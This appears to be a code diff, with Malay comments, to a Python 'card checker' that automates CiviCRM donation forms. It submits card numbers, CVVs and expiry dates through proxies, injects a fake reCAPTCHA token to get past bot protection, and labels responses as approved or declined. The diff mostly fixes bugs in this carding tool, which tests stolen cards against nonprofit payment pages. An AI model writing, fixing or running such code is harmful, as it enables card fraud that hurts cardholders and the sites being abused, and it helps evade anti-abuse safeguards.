@@ -91,7 +91,7 @@ def create_session(proxy_url=None):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.0",
+        "Accept-Language": "en-US,en;q=0.9",
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
@@ -192,7 +192,6 @@ def get_form_action_and_payload(session, url, proxy_url):
         
         html = resp.text
         
-        # ---> TAMBAHAN: CHECK QFKEY TERLEBIH DAHULU <---
         qfkey = None
         for pattern in [r'name="qfKey"\s+value="([^"]+)"', r'name="qfKey"\s*type="hidden"\s*value="([^"]+)"', r'qfKey=([a-zA-Z0-9]+)']:
             match = re.search(pattern, html)
@@ -200,7 +199,6 @@ def get_form_action_and_payload(session, url, proxy_url):
             
         if not qfkey:
             return None, None, None, None, "Failed: No qfKey (Blocked by Captcha/Cloudflare)"
-        # ---------------------------------------------
 
         processors = detect_payment_processor(html)
         has_authorize = 'authorize' in processors
@@ -221,7 +219,7 @@ def get_form_action_and_payload(session, url, proxy_url):
     except Exception as e:
         error_name = type(e).__name__
         if 'Timeout' in error_name or 'ConnectError' in error_name or 'ConnectionError' in error_name or 'ProxyError' in error_name:
-            return None, None, NULL, NULL, "Proxy Timed out"
+            return None, None, None, None, "Proxy Timed out"
         if 'SSLError' in error_name:
             return None, None, None, None, "SSL Error"
             
@@ -230,36 +228,29 @@ def get_form_action_and_payload(session, url, proxy_url):
 def parse_response(html, url):
     soup = BeautifulSoup(html, 'html.parser')
     
-    # 1. Cari div 'status' atau 'alert' (CiviCRM selalu letak error sini)
     status_div = soup.find('div', class_='status')
     if not status_div:
         status_div = soup.find('div', class_=re.compile(r'alert|error', re.I))
         
     if status_div:
-        # Cari semua <ul> atau <li> dalam div status tu
         error_items = status_div.find_all('li')
-        
         if error_items:
-            # Kalau ada senarai error, kumpulkan semua
             errors = [item.get_text(strip=True) for item in error_items]
             error_message = " | ".join(errors)
             return {'approved': False, 'has_msg': True, 'message': f'Form Error: {error_message}', 'clean_response': error_message}
         else:
-            # Kalau takde <li>, ambil teks terus
             error_text = status_div.get_text(strip=True)
             error_text = re.sub(r'\s+', ' ', error_text).strip()
             if error_text and len(error_text) > 3:
                 return {'approved': False, 'has_msg': True, 'message': f'Status: {error_text}', 'clean_response': error_text}
 
-    # 2. Kalau takde error, check URL kalau dia dah pergi ThankYou page
     if '_qf_ThankYou_display=true' in url or '_qf_ThankYou_display=1' in url:
         return {'approved': True, 'has_msg': False, 'message': 'Payment complete', 'clean_response': 'Payment complete'}
     
     if '_qf_Confirm_display=true' in url or '_qf_Confirm_display=1' in url:
         return {'approved': False, 'has_msg': False, 'message': 'Confirmation page', 'clean_response': '', 'is_confirmation': True}
     
-    # 3. Kalau sampai sini, maksudnya form tak complete
-    return {'approved': False, 'has_msg': False, 'message': 'Form Incomplete / Stuck on Initial Page', 'clean_response': 'Stuck on Initial'}
+    return {'approved': False, 'has_msg': False, 'message': 'Card Declined / Blocked by Site (Silent Response)', 'clean_response': 'Silent Block'}
 
 def process_site_for_payload(url, override_proxy=None):
     proxy_url = override_proxy if override_proxy else None
@@ -294,7 +285,7 @@ def extract_confirmation_form(html, soup):
 
     if confirm_form:
         form_id = confirm_form.get('id', '')
-        form_form_class = confirm_form.get('class', [])
+        form_class = confirm_form.get('class', [])
         form_action = confirm_form.get('action', '')
         if 'search' in str(form_id).lower() or any('search' in str(c).lower() for c in form_class) or 'search' in str(form_action).lower():
             confirm_form = None
@@ -314,7 +305,7 @@ def extract_confirmation_form(html, soup):
 
 def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=False):
     scheme = get_card_type(ccnum)
-    final_year = f"20{yy}" if len(yy) == 2 else yy
+    full_year = f"20{yy}" if len(yy) == 2 else yy
     input_month = int(mm)
 
     final_payload = {}
@@ -322,9 +313,8 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
     final_payload["qfKey"] = qfkey
     final_payload["entryURL"] = base_url.replace("&amp;", "&")
     
-    # ---> INJECT FAKE CAPTCHA TOKEN DI SINI <---
+    # INJECT FAKE CAPTCHA TOKEN
     final_payload["g-recaptcha-response"] = "03AGdBq25 FakeTokenCivicrmBypass1234567890"
-    # -----------------------------------------
 
     if is_confirm:
         final_payload["_qf_default"] = "Confirm:next"
@@ -378,7 +368,7 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
             if 'state' in key_lower or 'province' in key_lower: final_payload[key] = user_data['state_id']
             elif 'country' in key_lower: final_payload[key] = '1228'
             elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
-            elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = final_year
+            elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
             elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
             elif 'price' in key_lower or 'amount' in key_lower:
                 if not price_selected:
@@ -405,7 +395,7 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
 
         if 'card' in key_lower and ('number' in key_lower or 'no' in key_lower or 'num' in key_lower): final_payload[key] = ccnum
         elif 'cvv' in key_lower or 'cvc' in key_lower or 'cid' in key_lower or ('security' in key_lower and 'code' in key_lower): final_payload[key] = cvv
-        elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = final_year
+        elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
         elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
         elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
         
@@ -459,7 +449,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
         key_lower = key.lower()
         if 'price' in key_lower or 'amount' in key_lower:
             val = field_info.get('value', '0')
-            error_name = type(e).__name__
             try:
                 p = float(val)
                 if p > 0:
@@ -489,9 +478,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 "Upgrade-Insecure-Requests": "1"
             })
 
-            # ---> PRINT PAYLOAD INITIAL KE LOGS <---
-            logging.info(f"--- PAYLOAD DIHANTUKAN (INITIAL) ---\n{json.dumps(clean_initial, indent=2)}\n-------------------------------")
-            
             response = session.post(form_action, data=clean_initial, timeout=25, allow_redirects=True)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
@@ -513,8 +499,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 clean_confirm = build_clean_payload(merged_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
                 confirm_response = session.post(form_action, data=clean_confirm, timeout=25, allow_redirects=True)
                 
-                logging.info(f"--- PAYLOAD DIHANTUKAN (CONFIRM) ---\n{json.dumps(clean_confirm, indent=2)}\n-------------------------------")
-                
                 if confirm_response.status_code == 500:
                     result = {'approved': False, 'has_msg': True, 'message': 'Site Error / Not Authorize', 'clean_response': 'Site Error'}
                     if session: session.close()
@@ -522,8 +506,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 
                 result = parse_response(confirm_response.text, confirm_response.url)
             else:
-                # Maksudnya kita terkandas di Initial Page sebab form tak betul
-                # Kita hantar HTML ni ke parse_response untuk tangkap error
                 result = parse_response(response.text, response.url)
 
             if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
@@ -577,7 +559,7 @@ def handle_auth():
             result, detected_price = process_card_on_site(site_data, cc, mm, yy, cvv, override_proxy)
             
             if not result:
-                result = {'approved': False, ' page', 'clean_response': 'Failed'}
+                result = {'approved': False, 'message': 'Failed to process site data.', 'clean_response': 'Failed'}
         else:
             result = {'approved': False, 'message': site_data['status'], 'clean_response': site_data['status']}
             detected_price = 0.0
